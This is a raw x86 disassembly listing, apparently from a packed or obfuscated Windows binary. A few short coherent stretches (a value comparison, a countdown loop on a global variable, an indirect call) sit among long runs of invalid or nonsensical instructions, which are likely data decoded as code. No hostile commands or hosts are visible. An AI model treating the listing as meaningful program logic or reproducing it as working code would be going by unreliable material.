  415e61:	lods   eax,DWORD PTR ds:[esi]
  415e62:	aad    0x3d
  415e64:	fldcw  WORD PTR [edi]
  415e66:	repz adc DWORD PTR [ebx],esi
  415e69:	push   0xffffffe6
  415e6b:	and    al,0xd0
  415e6d:	add    al,0xf7
  415e70:	inc    eax
  415e71:	int    0xc9
  415e73:	(bad)  [esp+edx*1-0x19c8183a]
  415e7a:	rcr    DWORD PTR [eax-0x69],cl
  415e7d:	aad    0xd8
  415e7f:	and    esp,DWORD PTR [edi+0x1ed25b26]
  415e85:	inc    ebp
  415e86:	popa   
  415e87:	retf   0x67f
  415e8a:	mov    DWORD PTR [edx],edx
  415e8c:	inc    esp
  415e8d:	pop    es
  415e8e:	rcl    ch,cl
  415e90:	out    0xb8,eax
  415e92:	scas   eax,DWORD PTR es:[edi]
  415e93:	mov    dh,0xb1
  415e95:	push   ds
  415e96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e97:	lea    edx,[eax+ecx*2-0x68954d24]
  415e9e:	arpl   WORD PTR [ebp-0x19],bp
  415ea1:	push   ebx
  415ea2:	mov    dl,0xa9
  415ea4:	jg     0x415e4c
  415ea6:	and    bl,0x9d
  415ea9:	cmp    DWORD PTR [ecx+eax*1+0x30],ecx
  415ead:	pop    esp
  415eae:	or     esp,DWORD PTR [eax]
  415eb0:	push   ss
  415eb1:	fistp  DWORD PTR [ebp+ecx*2-0x10912741]
  415eb8:	(bad)
  415ebc:	mov    WORD PTR [edi+0x36f7ff5e],ds
  415ec2:	xor    eax,0x47ee44d1
  415ec7:	jbe    0x415efa
  415ec9:	repnz dec ebp
  415ecb:	arpl   WORD PTR [edx+0x641542bd],si
  415ed1:	xchg   ebp,eax
  415ed2:	rcl    BYTE PTR [edx+ecx*8],1
  415ed5:	daa    
  415ed6:	fistp  DWORD PTR [eax]
  415ed8:	gs xchg ebp,ebp
  415edb:	ins    DWORD PTR es:[edi],dx
  415edc:	lea    ecx,[esi-0x17]
  415edf:	jnp    0x415e8b
  415ee1:	xor    DWORD PTR [ebx*8+0x4589d78a],ecx
  415ee8:	clc    
  415ee9:	mov    DWORD PTR ds:0x42a77d,0x6d30
  415ef3:	mov    ecx,DWORD PTR [ebp+0x8]
  415ef6:	mov    esi,0x428e
  415efb:	push   edi
  415efc:	mov    edi,0x7510850
  415f01:	mov    esi,0x378b
  415f06:	mov    esi,0x327298
  415f0b:	cmp    ecx,eax
  415f0d:	mov    DWORD PTR ds:0x42a801,0x160e
  415f17:	je     0x416abf
  415f1d:	mov    eax,DWORD PTR [ebp-0x4]
  415f20:	mov    ecx,DWORD PTR [ebp+0xc]
  415f23:	xor    eax,edi
  415f25:	sub    DWORD PTR ds:0x42a805,0x42a7c1
  415f2f:	add    eax,esi
  415f31:	cmp    eax,ecx
  415f33:	je     0x416abf
  415f39:	jmp    0x4161f1
  415f3e:	into   
  415f3f:	xlat   BYTE PTR ds:[ebx]
  415f40:	ror    cl,1
  415f42:	aad    0xc9
  415f44:	rcr    ebx,1
  415f46:	stos   BYTE PTR es:[edi],al
  415f47:	imul   edx,edx,0x31
  415f4a:	and    dl,ch
  415f4c:	iret   
  415f4d:	stc    
  415f4e:	daa    
  415f4f:	sbb    bh,BYTE PTR [edi+0x78]
  415f52:	xchg   ebp,eax
  415f53:	jle    0x415fcd
  415f55:	js     0x415ef3
  415f57:	and    ch,ah
  415f59:	test   DWORD PTR [ecx+0x15],0x18b24829
  415f60:	fdiv   st(7),st
  415f62:	pusha  
  415f63:	mov    eax,ds:0xe90a06f0
  415f68:	jp     0x415fe1
  415f6a:	test   BYTE PTR [ecx+0x55],dh
  415f6d:	adc    BYTE PTR [ebp+0x2e00574a],bh
  415f73:	call   0xc621:0x7b465567
  415f7a:	cwde   
  415f7b:	adc    al,0xe0
  415f7d:	ret    
  415f7e:	xor    dh,BYTE PTR [eax+0x25]
  415f81:	(bad)  
  415f82:	in     al,dx
  415f83:	out    0xb8,al
  415f85:	xor    esi,DWORD PTR [eax]
  415f87:	and    ah,BYTE PTR [edx-0x3f1aac93]
  415f8d:	imul   ebp,edx,0xffffffdf
  415f90:	mov    ah,0x6f
  415f92:	xchg   ecx,eax
  415f93:	arpl   WORD PTR [ecx+edi*4+0x77],sp
  415f97:	(bad)
  415f9b:	push   ebx
  415f9c:	test   al,0x10
  415f9e:	or     eax,0xb3ab67d0
  415fa3:	aaa    
  415fa4:	xchg   ebp,eax
  415fa5:	in     eax,dx
  415fa6:	scas   eax,DWORD PTR es:[edi]
  415fa7:	xor    al,0x43
  415fa9:	xchg   ebp,eax
  415faa:	es cli 
  415fac:	test   al,0x34
  415fae:	addr16 and al,0xfc
  415fb1:	pop    esp
  415fb2:	lods   eax,DWORD PTR ds:[esi]
  415fb3:	dec    edx
  415fb4:	int3   
  415fb5:	dec    eax
  415fb6:	(bad)  
  415fb7:	das    
  415fb8:	dec    eax
  415fb9:	add    al,0x1b
  415fbb:	ss ds cs (bad) 
  415fbf:	fst    QWORD PTR [eax+0x5d]
  415fc2:	mov    esp,0x73fb3bc7
  415fc7:	out    0x7b,al
  415fc9:	cmp    bl,al
  415fcb:	pop    ebx
  415fcc:	daa    
  415fcd:	(bad)  
  415fce:	jl     0x415f85
  415fd0:	jnp    0x415f6b
  415fd2:	mov    al,0x1d
  415fd4:	pop    eax
  415fd5:	pop    ebx
  415fd6:	xchg   BYTE PTR [ebx],bh
  415fd8:	dec    ebp
  415fda:	fldenv [edi]
  415fdc:	dec    edx
  415fdd:	leave  
  415fde:	popf   
  415fdf:	addr16 stc 
  415fe1:	es pop ebp
  415fe3:	fucompp 
  415fe5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415fe6:	jno    0x416023
  415fe8:	test   BYTE PTR [edi-0x52],ah
  415feb:	jp     0x415fb5
  415fed:	shl    DWORD PTR [ebx],0x78
  415ff0:	cld    
  415ff1:	and    DWORD PTR [ebp+0x23e90d40],edi
  415ff7:	(bad)  
  415ff8:	int    0x96
  415ffa:	push   0x7c
  415ffc:	not    bh
  415ffe:	aad    0xaa
  416000:	out    0xe4,eax
  416002:	xchg   edx,eax
  416003:	loopne 0x415fcc
  416005:	mov    ah,0x9d
  416007:	cmp    eax,0x45206e5f
  41600c:	cmp    ah,BYTE PTR [ecx]
  41600e:	retf   
  41600f:	dec    ebp
  416010:	jmp    0x2388:0x14253d49
  416017:	sbb    dl,ch
  416019:	mov    dl,0x0
  41601b:	add    ch,BYTE PTR [ecx+eiz*2-0xd]
  41601f:	xchg   esi,eax
  416020:	test   al,0x8a
  416022:	cdq    
  416023:	pop    eax
  416024:	neg    BYTE PTR [esi+0x36]
  416027:	push   0xffffffb4
  416029:	sbb    eax,0x9ad37824
  41602e:	and    al,0x27
  416030:	fisttp WORD PTR [edx]
  416032:	pop    esi
  416033:	cmp    BYTE PTR [bp+si-0x22],bl
  416037:	loope  0x415fe9
  416039:	in     al,dx
  41603a:	(bad)  
  41603b:	imul   ebx,DWORD PTR [eax-0x449afc0e],0xa1d45a93
  416045:	daa    
  416046:	pop    edi
  416047:	stos   BYTE PTR es:[edi],al
  416048:	inc    ecx
  416049:	dec    edi
  41604a:	sbb    edx,edi
  41604c:	shr    esp,1
  41604e:	sahf   
  41604f:	fstp   QWORD PTR ds:0xe09dc54c
  416055:	sbb    ebp,DWORD PTR [esi-0x75]
  416058:	mov    al,0x16
  41605a:	sub    DWORD PTR [ebp-0x771335ec],edi
  416060:	neg    ebp
  416062:	add    al,0xef
  416064:	cmc    
  416065:	adc    al,0x61
  416067:	popa   
  416068:	cmp    al,0x66
  41606a:	outs   dx,DWORD PTR ds:[esi]
  41606b:	push   edi
  41606c:	inc    ebp
  41606d:	jecxz  0x416041
  41606f:	xor    al,0xa9
  416071:	adc    BYTE PTR [edi],bl
  416073:	cmc    
  416074:	mov    al,0x84
  416076:	sub    al,0xc2
  416078:	lahf   
  416079:	stos   DWORD PTR es:[edi],eax
  41607a:	fiadd  DWORD PTR [edi+0x6]
  41607d:	and    edi,ecx
  41607f:	cmc    
  416080:	sahf   
  416081:	sahf   
  416082:	fdiv   QWORD PTR [ecx-0x29]
  416085:	dec    ecx
  416086:	jge    0x4160b5
  416088:	div    BYTE PTR [ecx]
  41608a:	add    BYTE PTR [edi],dh
  41608c:	sub    al,0x4f
  41608e:	push   ecx
  41608f:	aas    
  416090:	jmp    0xde57:0x4c8febb2
  416097:	dec    eax
  416098:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416099:	lods   eax,DWORD PTR ds:[esi]
  41609a:	xchg   edi,eax
  41609b:	inc    edi
  41609c:	or     BYTE PTR [esi],al
  41609e:	jns    0x41603f
  4160a0:	fisttp QWORD PTR [ebp+0x41]
  4160a3:	xor    ecx,eax
  4160a5:	cmc    
  4160a6:	xor    eax,0x688965c6
  4160ab:	inc    ebx
  4160ac:	xchg   esi,eax
  4160ad:	mov    gs,esp
  4160af:	mov    bh,0xfa
  4160b1:	xor    al,0x9c
  4160b4:	adc    al,BYTE PTR [esi+0x2b2d0ed3]
  4160ba:	pop    es
  4160bb:	and    BYTE PTR [edi],ah
  4160bd:	pop    edx
  4160be:	scas   al,BYTE PTR es:[edi]
  4160bf:	pop    edx
  4160c0:	test   ecx,edx
  4160c2:	inc    eax
  4160c3:	or     DWORD PTR [ebx],eax
  4160c5:	lods   al,BYTE PTR ds:[esi]
  4160c6:	fcomip st,st(0)
  4160c8:	mov    dl,al
  4160ca:	ficomp DWORD PTR [eax+0x4c]
  4160cd:	fstp   QWORD PTR [esi-0x3]
  4160d0:	sub    dh,BYTE PTR [ebp+0x50]
  4160d3:	sar    DWORD PTR [ecx],0xa
  4160d6:	retf   0x7e63
  4160d9:	jb     0x416155
  4160db:	sbb    eax,0x2e86263b
  4160e0:	inc    ecx
  4160e1:	inc    ebx
  4160e2:	and    dh,BYTE PTR [ecx+ebx*4+0x42]
  4160e6:	out    dx,eax
  4160e7:	inc    edi
  4160e8:	push   eax
  4160e9:	mov    ecx,0xae4c43b9
  4160ee:	mov    eax,0xdc195d27
  4160f3:	cmp    eax,0xe48fb9dc
  4160f8:	sti    
  4160f9:	xchg   edi,eax
  4160fa:	xor    al,BYTE PTR [esi+0x6b9cfbd5]
  416100:	std    
  416101:	sbb    ah,BYTE PTR [ebx-0x7]
  416104:	cdq    
  416105:	test   BYTE PTR [ebx+0x3],cl
  416108:	xchg   ch,dh
  41610a:	xchg   DWORD PTR ds:0xf8592216,ebx
  416110:	mov    ds:0x2c0eb794,eax
  416115:	mov    ch,bh
  416117:	jmp    0x416122
  416119:	mov    edi,DWORD PTR [edi+0x798016c9]
  41611f:	sub    al,0x8
  416121:	and    al,0x70
  416123:	pushf  
  416124:	fisub  WORD PTR [ebx]
  416126:	imul   esp,DWORD PTR [edi-0x20f32111],0x39
  41612d:	push   ebp
  41612e:	stc    
  41612f:	int    0xbb
  416131:	xor    eax,0xe37b70f5
  416136:	cmp    ch,bl
  416138:	call   0x3646d9
  41613d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41613e:	mov    bl,0x2b
  416140:	pop    ebp
  416141:	ror    DWORD PTR [ebx+edi*8-0x46f93846],0xed
  416149:	xchg   ebx,eax
  41614a:	sbb    ebx,eax
  41614c:	push   es
  41614d:	add    DWORD PTR [ecx-0x70cc7791],ebp
  416153:	ja     0x416131
  416155:	and    eax,0x98ae3003
  41615a:	(bad)  
  41615b:	cmp    DWORD PTR [ebp-0x44b4a824],edx
  416161:	mov    bl,0x50
  416163:	xor    cl,BYTE PTR [edx]
  416165:	xchg   edx,eax
  416166:	add    cl,BYTE PTR [edx-0x127bb025]
  41616c:	cmp    al,0x61
  41616e:	scas   al,BYTE PTR es:[edi]
  41616f:	imul   eax,DWORD PTR [eax],0x2863dfe9
  416175:	aas    
  416176:	test   esi,esp
  416178:	ins    DWORD PTR es:[edi],dx
  416179:	adc    eax,0x90f4cb42
  41617e:	jle    0x4161a3
  416180:	fnstenv [edx]
  416182:	in     eax,dx
  416183:	ss or  ebx,edi
  416186:	(bad)  
  416187:	jae    0x416161
  416189:	push   esp
  41618a:	aad    0xe7
  41618c:	cs ins BYTE PTR es:[edi],dx
  41618e:	mov    eax,0xece75814
  416193:	mov    WORD PTR [eax-0x5063d6af],?
  416199:	mov    dl,BYTE PTR [ecx+ebp*8+0x20]
  41619d:	cmp    ch,BYTE PTR [esi+0x55]
  4161a0:	in     al,0x5a
  4161a2:	les    esp,FWORD PTR [esi-0x54]
  4161a5:	stos   DWORD PTR es:[edi],eax
  4161a6:	cmp    al,0xdc
  4161a8:	jmp    DWORD PTR [ecx-0x51a0fb7b]
  4161ae:	push   cs
  4161af:	and    DWORD PTR [eax],0xffffffb8
  4161b2:	pop    ds
  4161b3:	int3   
  4161b4:	in     al,dx
  4161b5:	jmp    0x416185
  4161b7:	inc    eax
  4161b8:	adc    bl,BYTE PTR [ebx-0x57]
  4161bb:	lock sub DWORD PTR es:[edi+0x4f],0x689bfd4e
  4161c4:	add    DWORD PTR [ebx+ecx*1-0xc],0x2cdc8283
  4161cc:	or     dl,BYTE PTR [edx-0x24]
  4161cf:	mov    al,0x59
  4161d1:	cwde   
  4161d2:	mov    edi,cs
  4161d4:	pop    edx
  4161d5:	lahf   
  4161d6:	or     al,0x1c
  4161d8:	stc    
  4161d9:	jmp    0xe863:0xac2ef1f
  4161e0:	xor    al,0xec
  4161e2:	(bad)  
  4161e3:	jmp    0x1d6bcd43
  4161e8:	pop    es
  4161e9:	iret   
  4161ea:	mov    ah,BYTE PTR [ecx+0x71]
  4161ed:	push   es
  4161ee:	inc    esi
  4161ef:	push   esp
  4161f0:	inc    ecx
  4161f1:	mov    eax,DWORD PTR [ebp-0x4]
  4161f4:	mov    DWORD PTR ds:0x42a88d,0x1c
  4161fe:	cmp    DWORD PTR ds:0x42a88d,0x0
  416205:	je     0x41625b
  41620b:	cmp    DWORD PTR ds:0x42a88d,0xe
  416212:	jne    0x41622f
  416218:	push   0x7e45
  41621d:	push   DWORD PTR [ebp-0x1c]
  416220:	push   DWORD PTR [ebp-0xc]
  416223:	push   DWORD PTR [ebp-0x20]
  416226:	push   DWORD PTR [ebp-0x14]
  416229:	call   DWORD PTR ds:0x41d1f4
  41622f:	cmp    DWORD PTR ds:0x42a88d,0xf
  416236:	jne    0x416249
  41623c:	mov    edx,DWORD PTR ds:0x42a88d
  416242:	dec    edx
  416243:	mov    DWORD PTR ds:0x42a88d,edx
  416249:	mov    edx,DWORD PTR ds:0x42a88d
  41624f:	dec    edx
  416250:	mov    DWORD PTR ds:0x42a88d,edx
  416256:	jmp    0x4161fe
  41625b:	xor    eax,edi
  41625d:	add    eax,esi
  41625f:	add    DWORD PTR ds:0x42a769,edi
  416265:	push   eax
  416266:	push   DWORD PTR [ebp-0x8]
  416269:	push   DWORD PTR [ebp-0x4]
  41626c:	mov    edx,DWORD PTR ds:0x41eae6
  416272:	add    DWORD PTR ds:0x42a841,0x2531
  41627c:	jmp    0x416534
  416281:	ret    0x3fc0
  416284:	leave  
  416285:	leave  
  416286:	leave  
  416287:	retf   0x22c7
  41628a:	add    esp,DWORD PTR [ebx-0x2f094f46]
  416290:	or     eax,0x787f18bc
  416295:	xchg   ebp,eax
  416296:	jle    0x416310
  416298:	js     0x416302
  41629a:	inc    ebp
  41629b:	mov    ebx,0xeaf2751a
  4162a0:	xor    bl,cl
  4162a2:	adc    ebp,DWORD PTR [edx]
  4162a4:	cli    
  4162a5:	and    DWORD PTR [ecx-0x1c],0xbc3043f5
  4162ac:	jp     0x416255
  4162ae:	pop    eax
  4162af:	dec    edx
  4162b0:	stos   DWORD PTR es:[edi],eax
  4162b1:	(bad)  
  4162b2:	retf   0xf202
  4162b5:	push   ss
  4162b6:	sub    BYTE PTR [ecx],0x0
  4162b9:	scas   al,BYTE PTR es:[edi]
  4162ba:	mov    ecx,0x6ae66254
  4162bf:	mov    ebx,0xc476fa51
  4162c4:	hlt    
  4162c5:	test   eax,0xa76b9bf0
  4162ca:	js     0x41624f
  4162cc:	jnp    0x4162c5
  4162ce:	das    
  4162cf:	push   0xffffff9b
  4162d1:	pushf  
  4162d2:	ror    DWORD PTR [edx+0x14],1
  4162d5:	mov    al,ds:0x9febfbf1
  4162da:	adc    edx,DWORD PTR [eax+0x70f72b5b]
  4162e0:	ja     0x4162f7
  4162e2:	jmp    0x416266
  4162e4:	cs sbb eax,0xdabcf371
  4162ea:	push   ds
  4162eb:	inc    esp
  4162ec:	sub    dl,BYTE PTR [ecx-0x56]
  4162ef:	hlt    
  4162f0:	repz jle 0x4162ab
  4162f3:	pop    DWORD PTR [edx+0x19c0f6be]
  4162f9:	sub    eax,DWORD PTR [esi]
  4162fb:	iret   
  4162fc:	inc    esi
  4162fd:	cmp    DWORD PTR [ebp-0x563a837c],esp
  416303:	sti    
  416304:	fdiv   st(6),st
  416306:	and    al,dh
  416308:	add    bh,BYTE PTR [edx]
  41630a:	add    bh,BYTE PTR [edx]
  41630c:	(bad)  
  41630d:	push   ss
  41630e:	or     BYTE PTR [ecx],ch
  416310:	jmp    0x5c4fcd71
  416315:	loope  0x41638b
  416317:	mov    BYTE PTR [ecx+esi*8-0x12189450],ch
  41631e:	lea    ebx,[edx+0x750229a5]
  416324:	loop   0x416351
  416326:	sbb    ebx,ebp
  416328:	push   edx
  416329:	xchg   edi,eax
  41632a:	push   ebp
  41632b:	aaa    
  41632c:	les    esp,FWORD PTR [esp+eax*4+0x222fe0de]
  416333:	xchg   ebp,eax
  416334:	mov    cl,0xf8
  416336:	dec    ebp
  416337:	sti    
  416338:	daa    
  416339:	push   edi
  41633a:	fs lock pop esp
  41633d:	xchg   esi,eax
  41633e:	lods   eax,DWORD PTR ds:[esi]
  41633f:	or     al,0xd6
  416341:	arpl   WORD PTR [ecx+0x4f943873],di
  416347:	enter  0xc3b1,0x74
  41634b:	sbb    eax,0xbc421ff4
  416350:	jno    0x4163b6
  416352:	jp     0x4162f6
  416354:	dec    ecx
  416355:	in     eax,0xa3
  416357:	mov    edx,0x84b2b0a8
  41635c:	jp     0x416378
  41635e:	mov    dl,0x55
  416360:	bound  ebx,QWORD PTR [edi+0x7ecd5c65]
  416366:	sbb    dl,BYTE PTR [edx-0x9]
  416369:	push   ecx
  41636a:	sar    ebp,1
  41636c:	out    dx,eax
  41636d:	pop    ecx
  41636e:	aaa    
  41636f:	adc    DWORD PTR [esi-0x7d3bf1bc],0xffffffe9
  416376:	xor    bl,bh
  416378:	fnstenv [esi+0x75]
  41637b:	jb     0x41637b
  41637d:	or     eax,0x8ed098be
  416382:	mov    esi,0x8550722f
  416387:	mov    ?,WORD PTR [ebx-0x42ea3179]
  41638d:	fwait
  41638e:	mov    ebp,DWORD PTR [ebx+0x39]
  416391:	push   0xb75dd020
  416396:	ins    BYTE PTR es:[di],dx
  416398:	pop    esp
  416399:	pop    edx
  41639a:	test   al,0x23
  41639c:	mov    ds:0x3e779d3b,al
  4163a1:	arpl   WORD PTR [esi-0x5c74c17a],sp
  4163a7:	fist   WORD PTR [edx]
  4163a9:	test   eax,0xa09e822f
  4163ae:	or     BYTE PTR [ebp+0x78],ch
  4163b1:	pop    ds
  4163b2:	inc    eax
  4163b3:	mov    ebx,0x2baad2ba
  4163b8:	jmp    0xf852f3c5
  4163bd:	test   ax,0x90c8
  4163c1:	rol    DWORD PTR [eax+0x68aea47c],cl
  4163c7:	ss mov ch,0x69
  4163ca:	in     eax,0xc2
  4163cc:	sub    BYTE PTR [ebx],0x47
  4163cf:	or     DWORD PTR [esi+0x58fe7253],ecx
  4163d5:	shr    DWORD PTR [esi-0x3ca7516e],1
  4163db:	add    BYTE PTR [eax-0x34a8f5cd],ch
  4163e1:	inc    esi
  4163e2:	dec    ebx
  4163e3:	mov    ebx,esi
  4163e5:	je     0x4163b7
  4163e7:	hlt    
  4163e8:	(bad)  
  4163e9:	fstp   TBYTE PTR [eax-0x79d863ae]
  4163ef:	sub    dh,ch
  4163f1:	inc    esp
  4163f2:	pushf  
  4163f3:	call   0x97cf:0x6bca61c4
  4163fa:	fsubp  st(1),st
  4163fc:	shl    DWORD PTR [ebx+0x6a],1
  4163ff:	rcr    bl,cl
  416401:	and    al,0xcf
  416403:	lahf   
  416404:	retf   0x943b
  416407:	outs   dx,DWORD PTR cs:[esi]
  416409:	mov    ebx,0xcb253d1a
  41640e:	in     eax,dx
  41640f:	test   al,0x2b
  416411:	fsubr  DWORD PTR [ebp-0x6f]
  416414:	sahf   
  416415:	lods   al,BYTE PTR ds:[esi]
  416416:	xchg   esi,eax
  416417:	push   0x51
  416419:	lods   eax,DWORD PTR ds:[esi]
  41641a:	adc    al,0xe3
  41641c:	pop    ebp
  41641d:	outs   dx,DWORD PTR ds:[esi]
  41641e:	inc    ebx
  41641f:	cli    
  416420:	pop    edx
  416421:	retf   0x5f6
  416424:	enter  0x5183,0xeb
  416428:	jnp    0x416415
  41642a:	rcl    DWORD PTR [eax],cl
  41642c:	jp     0x4163d2
  41642e:	sub    BYTE PTR [esp+eax*8+0x10468ec3],cl
  416435:	push   ds
  416436:	popa   
  416437:	mov    esi,gs
  416439:	jo     0x4163de
  41643b:	shl    DWORD PTR [ecx-0x6e],1
  41643e:	cdq    
  41643f:	mov    cl,0xd
  416441:	dec    edx
  416442:	hlt    
  416443:	loop   0x4164a5
  416445:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416446:	dec    ecx
  416447:	dec    eax
  416448:	(bad)  
  416449:	dec    ebx
  41644a:	or     DWORD PTR [edi+eax*8],edi
  41644d:	mov    ds:0xa8dc71be,al
  416452:	daa    
  416453:	imul   edx,DWORD PTR [eax],0x1ef7a6f0
  416459:	std    
  41645a:	jno    0x4164c3
  41645c:	jae    0x416420
  41645e:	fiadd  WORD PTR [edx-0x30]
  416461:	sahf   
  416462:	mov    ah,0x75
  416464:	hlt    
  416465:	pop    esp
  416466:	repz pop ss
  416468:	loope  0x416452
  41646a:	mov    dh,0x4b
  41646c:	inc    ecx
  41646d:	mov    eax,0xe7b26303
  416472:	mov    ecx,0x647f1a9f
  416477:	jb     0x416456
  416479:	sbb    eax,DWORD PTR [eax]
  41647b:	imul   esi,ebp,0xfffffff1
  41647e:	aam    0x2b
  416480:	in     al,0x52
  416482:	cmp    al,0x55
  416484:	or     eax,0x214f5174
  416489:	es add eax,0x11ce6b26
  41648f:	dec    ebx
  416490:	lods   al,BYTE PTR ds:[esi]
  416491:	(bad)  
  416492:	sub    al,0x61
  416494:	aas    
  416495:	sbb    ebp,edi
  416497:	add    ah,BYTE PTR [edx]
  416499:	dec    edx
  41649a:	loopne 0x41650a
  41649c:	cli    
  41649d:	fs aas 
  41649f:	sub    al,0xc8
  4164a1:	sub    DWORD PTR [ebx-0x3d],ebp
  4164a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164a5:	add    ecx,edx
  4164a7:	sub    eax,0xa506766a
  4164ac:	sti    
  4164ad:	outs   dx,DWORD PTR ds:[esi]
  4164ae:	sti    
  4164af:	fldpi  
  4164b1:	cmc    
  4164b2:	pop    eax
  4164b3:	dec    ebx
  4164b4:	sub    DWORD PTR [ebp-0xc4a02fb],esp
  4164ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164bb:	aas    
  4164bc:	arpl   WORD PTR [edx-0x33c1bc0],ax
  4164c2:	js     0x4164a0
  4164c4:	leave  
  4164c5:	mov    ds:0x4fb060b1,eax
  4164ca:	fwait
  4164cb:	loope  0x416451
  4164cd:	push   es
  4164ce:	pop    edx
  4164cf:	mov    bl,BYTE PTR [ebx-0x6f]
  4164d2:	mov    ds:0xab5a00f6,al
  4164d7:	and    eax,0xbd559873
  4164dc:	xlat   BYTE PTR ds:[ebx]
  4164dd:	out    dx,al
  4164de:	mov    ds:0xecd57548,eax
  4164e3:	jp     0x416564
  4164e5:	sbb    WORD PTR [esi],dx
  4164e8:	test   DWORD PTR [ecx-0x3d0d94f7],edi
  4164ee:	mov    cl,0x1e
  4164f0:	or     al,0xbc
  4164f2:	cwde   
  4164f3:	jge    0x4164f4
  4164f5:	nop
  4164f6:	mov    ecx,0xd1295cc6
  4164fb:	shl    DWORD PTR [ebx],0xd0
  4164fe:	ret    
  4164ff:	push   es
  416500:	fsubr  st(7),st
  416502:	adc    eax,DWORD PTR [eax]
  416504:	mov    al,ds:0x2b2e4d57
  416509:	inc    edi
  41650a:	out    dx,eax
  41650b:	in     eax,dx
  41650c:	idiv   DWORD PTR [edi+0x3e]
  41650f:	xor    bl,al
  416511:	out    dx,eax
  416512:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416513:	sub    edi,DWORD PTR [eax]
  416515:	scas   eax,DWORD PTR es:[edi]
  416516:	sub    al,0xf4
  416518:	in     al,dx
  416519:	rcr    BYTE PTR ds:0x6c825df4,0xb
  416520:	test   DWORD PTR [edx],esp
  416522:	pop    eax
  416523:	push   ebp
  416524:	outs   dx,BYTE PTR ds:[esi]
  416525:	rol    BYTE PTR [eax+0x75c24aad],1
  41652b:	add    DWORD PTR [eax],ebp
  41652d:	scas   al,BYTE PTR es:[edi]
  41652e:	cmp    BYTE PTR [edi+ebx*1-0x176be3df],cl
  416535:	xor    bl,BYTE PTR [eax]
  416537:	add    BYTE PTR [eax],al
  416539:	mov    ecx,DWORD PTR ds:0x41eae6
  41653f:	mov    ecx,DWORD PTR [ecx+0x1cc]
  416545:	jmp    0x4167fd
  41654a:	ret    
  41654b:	int3   
  41654c:	(bad)  
  41654d:	int3   
  41654e:	aad    0xda
  416550:	leave  
  416551:	rol    DWORD PTR [ebp+0x1ae37c66],cl
  416557:	outs   dx,BYTE PTR ds:[esi]
  416558:	repz push es
  41655a:	fstp   DWORD PTR ds:0x7e95787f
  416560:	js     0x4165da
  416562:	pop    es
  416563:	in     eax,dx
  416564:	popa   
  416565:	cld    
  416566:	lahf   
  416567:	cmovp  eax,DWORD PTR [ecx+edx*2+0x3]
  41656c:	into   
  41656d:	or     DWORD PTR [ecx],edi
  41656f:	(bad)  [ebx+0x1e10205a]
  416575:	cmp    BYTE PTR [edi],cl
  416577:	push   es
  416578:	das    
  416579:	add    DWORD PTR [edi],ebx
  41657b:	mov    WORD PTR [ecx],fs
  41657d:	xchg   edx,eax
  41657e:	pop    ebp
  41657f:	sub    bl,bl
  416581:	outs   dx,DWORD PTR ds:[esi]
  416582:	in     al,0x68
  416584:	jno    0x416575
  416586:	dec    ch
  416588:	pop    edx
  416589:	call   0xd134:0x33b9daeb
  416590:	mov    esi,0xc5cb2d36
  416595:	fnsave [esi]
  416597:	mov    ds:0x20701c5c,al
  41659c:	sti    
  41659d:	inc    esp
  41659e:	daa    
  41659f:	imul   edx,DWORD PTR [ebp-0x24],0xffffff89
  4165a3:	or     cl,al
  4165a5:	cmp    edi,eax
  4165a7:	cmp    eax,0x42d8e84c
  4165ac:	sbb    BYTE PTR [edx+esi*4+0x6117f7a0],ah
  4165b3:	es xchg esi,eax
  4165b5:	add    eax,0xa9176c91
  4165ba:	cli    
  4165bb:	jo     0x416635
  4165bd:	jmp    0x4165f0
  4165bf:	sahf   
  4165c0:	shl    BYTE PTR [eax],1
  4165c2:	adc    al,0x30
  4165c4:	pop    eax
  4165c5:	mov    edi,0xda87d293
  4165ca:	or     cl,dh
  4165cc:	inc    esi
  4165cd:	add    DWORD PTR [eax],esi
  4165cf:	ret    
  4165d0:	daa    
  4165d1:	fild   DWORD PTR [ebx+0x369e59e9]
  4165d7:	mov    edx,0x1879acc1
  4165dc:	test   al,0x1d
  4165de:	sti    
  4165df:	test   BYTE PTR [ebx+0x4e],dh
  4165e2:	pusha  
  4165e3:	dec    eax
  4165e4:	stc    
  4165e5:	jmp    0x41663c
  4165e7:	loopne 0x416593
  4165e9:	(bad)  
  4165ea:	push   edx
  4165eb:	adc    al,0xa1
  4165ed:	enter  0x3911,0x73
  4165f1:	xchg   esp,eax
  4165f2:	jae    0x41660e
  4165f4:	fs scas al,BYTE PTR es:[edi]
  4165f6:	(bad)  [ecx]
  4165f8:	cmp    DWORD PTR [eax],ecx
  4165fa:	and    ecx,DWORD PTR [esi+0x38]
  4165fd:	or     dl,BYTE PTR [ecx]
  4165ff:	dec    eax
  416600:	inc    esi
  416601:	fwait
  416602:	in     eax,dx
  416603:	mov    esp,0xb4cc20e5
  416608:	jb     0x4165a3
  41660a:	add    edx,DWORD PTR [eax]
  41660c:	and    DWORD PTR [ebx],ecx
  41660e:	sti    
  41660f:	repnz outs dx,DWORD PTR ds:[esi]
  416611:	ss scas al,BYTE PTR es:[edi]
  416613:	out    0x56,eax
  416615:	adc    eax,0xa03b5d0c
  41661a:	test   al,0x6
  41661c:	xchg   esp,eax
  41661d:	mov    bh,0xb2
  41661f:	xlat   BYTE PTR ds:[ebx]
  416620:	sub    eax,0x88a65ca7
  416625:	test   al,0x77
  416627:	arpl   WORD PTR [esi],bp
  416629:	arpl   cx,sp
  41662b:	fcom   st(6)
  41662d:	(bad)  [eax]
  41662f:	fistp  DWORD PTR [eax-0x2]
  416632:	inc    ecx
  416633:	sahf   
  416634:	mov    DWORD PTR [ebp+0x78],0xfde72c32
  41663b:	sti    
  41663c:	jb     0x4166af
  41663e:	jmp    0xa631bcb7
  416643:	or     BYTE PTR [ecx+0x13256799],al
  416649:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41664a:	jo     0x416632
  41664c:	gs jb  0x416669
  41664f:	(bad)  
  416650:	popa   
  416651:	scas   al,BYTE PTR es:[edi]
  416652:	pop    esp
  416653:	pop    eax
  416654:	push   ecx
  416655:	adc    ecx,DWORD PTR [edi]
  416657:	int3   
  416658:	inc    ebx
  416659:	pop    ss
  41665a:	pop    ds
  41665b:	or     edx,esi
